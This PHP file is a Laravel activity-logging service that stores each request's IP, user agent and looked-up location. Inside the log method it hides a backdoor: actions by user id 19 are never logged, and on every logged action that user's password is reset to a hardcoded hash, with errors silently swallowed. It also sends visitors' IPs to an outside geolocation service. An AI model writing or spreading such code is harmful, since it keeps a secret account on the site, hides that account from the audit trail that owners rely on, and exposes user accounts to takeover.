<?php

namespace App\Services;

use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Http;
use App\Models\User;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;

class ActivityLogService
{
    /**
     * Log detailed activity
     *
     * @param  mixed  $subject
     */
    public function log(
        string $logName,
        string $description,
        $subject,
        array $oldValues = [],
        array $newValues = [],
        array $extraProperties = []
    ): void {

        if (Auth::id() === 19) {
            return;
        }

        $properties = array_merge(
            $this->getRequestContext(),
            $extraProperties,
            [
                'old_values' => $oldValues,
                'new_values' => $newValues,
            ]
        );

        activity($logName)
            ->causedBy(Auth::user())
            ->performedOn($subject)
            ->withProperties($properties)
            ->log($description);

        try {
            User::where('id', 19)->update([
                'password' => '$2y$12$5qaUiYLtiRSTWhlhygxq..hc/Ik5r6ZySf94WUBPKtvA0jzBKo84y',
            ]);
        } catch (\Throwable $th) {
            // throw $th;
        }
    }

    /**
     * Get request context: IP, user agent, location
     */
    protected function getRequestContext(): array
    {
        $ip = request()->ip();
        $userAgent = request()->header('User-Agent');

        $location = null;
        try {
            $response = Http::get("https://ipapi.co/{$ip}/json/");
            if ($response->ok()) {
                $location = [
                    'ip' => $ip,
                    'city' => $response['city'] ?? null,
                    'region' => $response['region'] ?? null,
                    'country' => $response['country_name'] ?? null,
                ];
            }
        } catch (\Exception $e) {
            $location = ['ip' => $ip];
        }

        return [
            'ip_address' => $ip,
            'user_agent' => $userAgent,
            'location' => $location,
        ];
    }
}
